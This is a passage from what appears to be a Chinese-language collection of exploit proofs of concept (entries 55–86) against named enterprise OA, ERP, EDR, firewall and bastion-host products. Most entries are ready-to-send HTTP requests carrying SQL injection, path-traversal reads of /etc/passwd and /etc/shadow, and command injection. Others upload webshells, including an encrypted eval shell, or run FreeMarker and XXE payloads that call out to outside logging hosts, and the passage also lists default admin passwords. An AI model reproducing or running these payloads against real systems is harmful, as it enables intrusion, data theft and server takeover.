Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 417

DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
FILETYPE=Li5cMW5kZXguanNw
RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66

1
```

shell:http://xx.xx.xx.xx/1ndex.jsp

## 55.华天动力oa SQL注入

访问

http://xxxx//report/reportJsp/showReport.jsp?raq=%2FJourTemp2.raq&reportParamsId=100xxx

然后抓包

```
POST /report/reportServlet?action=8 HTTP/1.1
Host: xxxx
Content-Length: 145
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://xxx/
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://xxxx/report/reportJsp/showReport.jsp?raq=%2FJourTemp2.raq&reportParamsId=100xxx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D207AE96056400942620F09D34B8CDF3
Connection: close

year=*&userName=*&startDate=*&endDate=*&dutyRule=*&resultPage=%2FreportJsp%2FshowRepo
```

## 56.金蝶云星空 CommonFileserver 任意文件读取漏洞

```
 GET /CommonFileServer/c:/windows/win.ini
```
## 57.金和OA C6-GetSqlData.aspx SQL注入漏洞 POC

```
POST /C6/Control/GetSqlData.aspx/.ashx
Host: ip:port 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
Connection: close
Content-Length: 189
Content-Type: text/plain
Accept-Encoding: gzip

exec master..xp_cmdshell 'ipconfig'
```
## 58.金和OA 未授权

1. ​漏洞链接

http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1

1. ​ 复现步骤

http://xx.xx.xx.xx/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1

## 59.金盘 微信管理平台 getsysteminfo 未授权访问漏洞

```
/admin/weichatcfg/getsysteminfo
```

## 60.金山EDR代码执行漏洞

开启⽇志
/Console/inter/handler/change_white_list_cmd.php id参数

```
POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
Host: 192.168.24.3:6868
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101
Firefox/114.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 131
Origin: http://192.168.24.3:6868
Connection: close
Referer: http://192.168.24.3:6868/settings/system/user.php?m1=7&m2=0

{"change_white_list_cmd":{"ip":"{BD435CCE-3F91EC}","name":"3AF264D9-
AE5A","id":"111;set/**/global/**/general_log=on;","type":"0"}}
```

设置日志php文件

```
POST /inter/ajax.php?cmd=get_user_login_cmd HTTP/1.1
Host: 192.168.24.3:6868
Content-Length: 195
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.24.3:6868
Referer: http://192.168.24.3:6868/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SKYLARa0aedxe9e785feabxae789c6e03d=tf2xbucirlmkuqsxpg4bqaq0snb7
Connection: close

{"change_white_list_cmd":{"ip":"{BD435CCE-3F91EC}","name":"3AF264D9-
AE5A","id":"111;set/**/global/**/general_log_file=0x2e2e2f2e2e2f436f6e736f6c652f6368656
36b5f6c6f67696e322e706870;","type":"0"}}
```

写入php代码

```
POST /inter/ajax.php?cmd=settings_distribute_cmd HTTP/1.1
Host: 192.168.24.3:6868
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101
Firefox/114.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 222
Origin: http://192.168.24.3:6868
Connection: close
Referer: http://192.168.24.3:6868/index.php
{"settings_distribute_cmd":{"userSession":"{BD435CCE-3F91-E1AA-3844-
76A49EE862EB}","mode_id":"3AF264D9-AE5A-86F0-6882-DD7F56827017","settings":"3AF264D9-
AE5A-86F0-6882-DD7F56827017_0","SC_list":{"a":"<?php phpinfo();?>"}}}
```

最后get请求rce：

```
http://192.168.24.3:6868/check_login2.php
```

## 61.金山终端安全系统V9任意文件上传漏洞

```
POST /inter/software_relation.php HTTP/1.1 
Host: 192.168.249.137:6868 
Content-Length: 1557 
Pragma: no-cache 
Cache-Control: no-cache 
Upgrade-Insecure-Requests: 1 
Origin: http://192.168.249.137:6868 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxRP5VjBKdqBrCixM 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Connection: close 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name="toolFileName" 

../../datav.php 
------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name="toolDescri" 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name="id" 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name="version" 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name="sofe_typeof" 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name="fileSize" 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name="param" 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name="toolName" 

------WebKitFormBoundaryxRP5VjBKdqBrCixM 
Content-Disposition: form-data; name="toolImage"; filename="3.php" 
Content-Type: image/png 

<?php @error_reporting(0); session_start(); $key="e45e329feb5d925b"; //rebeyond $_SESSION['k']=$key; session_write_close(); $post=file_get_contents("php://input"); if(!extension_loaded('openssl')) { $t="base64_"."decode"; $post=$t($post.""); for($i=0;$i<strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&15]; } } else { $post=openssl_decrypt($post, "AES128", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p."");}} @call_user_func(new C(),$params); ?> 
------WebKitFormBoundaryxRP5VjBKdqBrCixM
```

## 62.蓝凌EKP系统存在未授权访问漏洞

漏洞描述：蓝凌EKP由深圳市蓝凌软件股份有限公司自出研发，是一款全程在线数字化OA，应用于大中型企业在线化办公。包含流程管理、知识管理、会议管理、公文管理、任务管理及督办管理等100个功能模块。。攻击者可利 用漏洞获取大量敏感信息。

```
relative: req0
session: false
requests:
- method: GET
timeout: 10
path: /./ui-ext/./behavior/
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
follow_redirects: false
matches: (code.eq("200") && body.contains("ekp_server.log"))
```

## 63.蓝凌-OA-RCE

通过文件上传-->解压-->获取webshell，前台漏洞

漏洞路径：

```
/api///sys/ui/sys_ui_extend/sysUiExtend.do
```

```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: /
Connection: Keep-Alive
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
var={"body":{"file":"file:///etc/passwd"}}
```
## 64.绿盟 NF 下一代防火墙 任意文件上传漏洞

```
POST /api/v1/device/bugsInfo HTTP/1.1
Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef
Host:
--4803b59d015026999b45993b1245f0ef
Content-Disposition: form-data; name="file"; filename="compose.php"

<?php eval($_POST['cmd']);?>
--4803b59d015026999b45993b1245f0ef--


POST /mail/include/header_main.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
Host:

cmd=phpinfo();	
```
## 65.绿盟 SAS堡垒机 Exec 远程命令执行漏洞

```
GET /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
```
## 66.绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞

```
GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
```
## 67.绿盟sas安全审计系统任意文件读取漏洞

`/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd`

```
/api/virtual/home/status?cat=../../../../../../../../etc/passwd
```

```
GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
```
## 68.明源ERP存在SQL时间盲注

漏洞描述：明源地产ERP系统具有丰富的房地产行业经验和定制化功能,可以适应不同企业的需求。该系统存在sqI注 入漏洞，可获取服务器权限

```
relative: req0 && req1
session: false
requests:
- method: GET
timeout: 13
path: /cgztbweb/VisitorWeb/VistorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAT%20'0:0:5'--&ywtype=GETParentProjectName
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
follow_redirects: true
matches: (time.gt("5")) && time.lt("10")
- method: GET
timeout: 10
path: /cgztbweb/VisitorWeb/VistorWeb_XMLHTTP.aspx?ParentCode=1';WAITFOR%20DELAT%20'0:0:0'--&ywtype=GETParentProjectName
headers:
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.2786.81 Safari/537.36
follow_redirects: true
matches: time.lt("5")

```

## 69.明源云 ERP ApiUpdate.ashx 文件上传漏洞

```
POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
Host: target.com
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 856

{{unquote("PK\x03\x04\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00../../../fdccloud/_/check.aspx$\xcc\xcb\x0a\xc20\x14\x04\xd0_\x09\x91B\xbb\x09\x0a\xddH\xab\x29\x8aP\xf0QZ\xc4\xf5m\x18j!ib\x1e\x82\x7fo\xc4\xdd0g\x98:\xdb\xb1\x96F\xb03\xcdcLa\xc3\x0f\x0b\xce\xb2m\x9d\xa0\xd1\xd6\xb8\xc0\xae\xa4\xe1-\xc9d\xfd\xc7\x07h\xd1\xdc\xfe\x13\xd6%0\xb3\x87x\xb8\x28\xe7R\x96\xcbr5\xacyQ\x9d&\x05q\x84B\xea\x7b\xb87\x9c\xb8\x90m\x28<\xf3\x0e\xaf\x08\x1f\xc4\xdd\x28\xb1\x1f\xbcQ1\xe0\x07EQ\xa5\xdb/\x00\x00\x00\xff\xff\x03\x00PK\x01\x02\x14\x03\x14\x00\x00\x00\x08\x00\xf2\x9a\x0bW\x97\xe9\x8br\x8c\x00\x00\x00\x93\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00../../../fdccloud/_/check.aspxPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00L\x00\x00\x00\xc8\x00\x00\x00\x00\x00")}}
```
## 70.企业微信（私有化版本）敏感信息泄露漏洞

紧急通知，长亭报出企业微信存在信息泄露0day！目前已在准备预警，请注意！

企业微信URL/cgi-bin/gateway/agentinfo

接口未授权情况下可直接获取企业微信secret等敏感信息

受影响版本：2.5.x、2.6.930000、以下；

不受影响：2.7.x、2.8.x、2.9.x；

危害：

1、可导致企业微信全量数据被获取、文件获取，

2、存在使用企业微信轻应用对内发送钓鱼文件和链接等风险。

修复方法：

1、在waf上设置一个规则，匹配到/cgi-bin/gateway/agentinfo路径的进行阻断；

2、联系厂家进行获取修复包；

3、官方通报及补丁地址

复现及漏洞详情分析：

第一步：，通过泄露信息接口可以获取corpid和corpsecret

https://<企业微信域名>/cgi-bin/gateway/agentinfo

第二步，使用corpsecret和corpid获得token

https://<企业微信域名>/cgi-bin/gettoken?corpid=ID&corpsecret=SECRET

第三步，使用token访问诸如企业通讯录信息，修改用户密码，发送消息，云盘等接口

https://<企业微信域名>/cgi-bin/user/get?access_token=ACCESS_TOKEN&userid=USERID


## 71.启明星辰-4A 统一安全管控平台 getMater 信息泄漏

启明星辰集团4A统一安全管控平台实现IT资源集中管理,为企业提供集中的账号、认证、授权、审计管理技术支撑及配套流程,提升系统安全性和可管理能力。可获取相关人员敏感信息。

```
poc:
  relative: req0
  session: false
  requests:
  - method: GET
    timeout: 10
    path: /accountApi/getMaster.do
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/65.0.881.36 Safari/537.36
    follow_redirects: true
    matches: (code.eq("200") && body.contains("\"state\":true"))
```

修复建议：

限制文件访问

## 72.契约锁电子签章系统 RCE

```
POST /callback/%2E%2E;/code/upload HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type:multipart/form-data;

boundary=----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
Content-Disposition: form-data; name="type";

TIMETASK
----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
Content-Disposition: form-data; name="file"; filename="qys.jpg"

马儿

----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
```

## 73.任我行 CRM SmsDataList SQL注入漏洞

```
POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 170

Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=00000000*
```

## 74.锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞

```
POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
Host: 
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="111.php"
Content-Type: image/jpeg

<?php phpinfo();?>
```

## 75.锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露
漏洞描述：锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露漏洞

批量扫描工具：
https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BAWEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FEXCU_SHELL

```
GET /EXCU_SHELL HTTP/1.1

Host: 

User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2852.74 Safari/537.36

Accept-Encoding: gzip, deflate

Accept: */*

Connection: close

Cmdnum: '1'

Command1: show running-config

Confirm1: n
```

## 75.赛思SuccezBI前台任意文件上传

```
POsT /succezbi/sz/commons/form/file/uploadChunkFile:guid=../tomcat/webapps/ROOT/&chunk=ss.jsp HTTP/1.1
Host: 10.168.4.99:808
Content-Length: 49564
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8GeAY18LCxR7XnVp
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10 15 7) Applewebkit/537.36 (KHTML, likeGecko) Chrome/106.9.. Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;g=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip， deflate
Accept-Language: zh-CN,zh;g=0.9
Cookie: JSESSIONID=7351EFC189410384FF702A41106FF4A2
Connection: close

-----WebKitFormBoundarv8GeAY18LCXR7XnVPContent-Disposition: 
form-data; name="file"; filename="ww'
Content-Type: image/jpeg

webshell
-----WebKitFormBoundarv8GeAY18LCXR7XnVP
Content-Disposition: form-data; name="tijiao'

confirm
------WebKitFormBoundarv8GeAY18LCXR7XnVP--
```

木马地址：ww_ss.jsp

## 76.深信服SG上网优化管理系统catjs.php任意文件读取漏洞

```
POST /php/catjs.php


["../../../../../../../../etc/shadow"]
```
## 77.深信服报表

```
POST /rep/login HTTP/1.1 
Host: 
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0 Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 
Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2 
Accept-Encoding: gzip deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: cross-site 
Pragma: no-cache 
Cache-Control: no-cache14 
Te: trailers 
Connection: close 
Content-Type:application/x-www-form-urlencoded 
Content-Length: 126 

clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.7550103466497915&userID=admin%0Aid -a %0A&userPsw=tmbhuisq
```



poc2

```
POST /rep/login HTTP/1.1 
Host: 
Cookie: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0 Accept:text/html,application/xhtml+xml,application/xml;g=0,9, image/avif, image/webp,*/*;q=0.8 
Accept-Language:zh-CN, zh;g=0.8, zh-TW;g=0.7, zh-HK;g=0.5,en-US;g=0.3,en;g=0.2 
Accept-Encoding: gzip deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: cross-site 
Pragma: no-cache 
Cache-Control: no-cache14 
Te: trailers 
Connection: close 
Content-Type:application/x-www-form-urlencoded 
Content-Length: 126 

clsMode=cls_mode_login%0Awhoami%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```

## 78.深信服数据中心管理系统 XML 实体注入漏洞

```
GET /src/sangforindex HTTP/1.1
Host: ip:port
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko)
Accept:
text/xml,application/xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: text/xml
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: Keep-alive
Content-Length: 135
<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE root [
<!ENTITY rootas SYSTEM "http://dnslog">
]>
<xxx>
&rootas;
</xxx>
```

## 79.深信服应用交付系统命令执行漏洞

```
POST /rep/login
Host:10.10.10.1:85

clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```

## 80.天钥网关前台SQL注入

天钥默认账号密码: 

sysuseradmin/ sua_password$123 

sysauditor/ sa_password$123 

sysadmin/password$123 

sysadmin1/sysadmin111111 

```
POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
Host: ****
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Language: zh-CN,zh;q=0.9
Cookie: ****
Content-Type: application/x-www-form-urlencoded
Content-Length: 39


checkname=123&tagid=123
```

```
sqlmap -u "https://****/ops/index.php?c=Reportguide&a=checkrn" --data "checkname=123&tagid=123" -v3 --skip-waf --random-agent
```

## 81.通达oa_sql注入

通达OA版本11.10之前存在SQL注入。

通过时间延迟获取数据库信息

验证POC1：

```
/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

验证POC2：

```
/general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

```

GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
Host: 192.168.232.137:8098
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=779f3f46
Upgrade-Insecure-Requests: 1

```

本地环境的数据库为TD_OA

在ASCII码中84代表的是 T 


## 82.通达oaCVE-2023-4166

 **影响范围**

通达OA

是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是适合各个行业用户的综合管理办公平台

本次范围：通达OA版本11.10之前

 **POC** 

post请求包

```
GET /general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1
Host: 192.168.232.137:8098
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=779f3f46
Upgrade-Insecure-Requests: 1
```

## 83.网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞

漏洞描述：网神 SecGate 3600 防火墙 obj_app_upfile接口存在任意文件上传漏洞，攻击者通过构造特殊请求包即可获取服务器权限
漏洞影响：网神 SecGate 3600 防火墙
网络测绘：fid="1Lh1LHi6yfkhiO83I59AYg=="

## 漏洞复现

```
POST /?g=obj_app_upfile HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 574
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="upfile"; filename="vulntest.php"
Content-Type: text/plain

<?php system("id");unlink(__FILE__);?>

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```

默认上传路径 /secgate/webui/attachements/ ， 访问 attachements/xxx.php 文件

## 84.网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞
```
POST /changepass.php?type=2 

Cookie: admin_id=1; gw_user_ticket=ffffffffffffffffffffffffffffffff; last_step_param={"this_name":"test","subAuthId":"1"}
old_pass=&password=Test123!@&repassword=Test123!@
```

## 85.网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞

```
/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23
```

## 86.新开普智慧校园系统代码执行漏洞

漏洞详情

新开普智慧校园系统/service_transport/service.action接口处存在FreeMarker模板注入，攻击者可在未经身份认证的情况下，调用后台接口，构造恶意代码实现远程代码执行，最终可造成服务器失陷。

路径存在则漏洞存在

http://xxx.com/service_transport/service.action

poc没回显

```
POST /service_transport/service.action HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
 
{
        "command": "GetFZinfo", 
        "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c ping v0u26h.ceye.io\")}"
}
```

写文件

```
POST /service_transport/service.action HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
 
{
        "command": "GetFZinfo", 
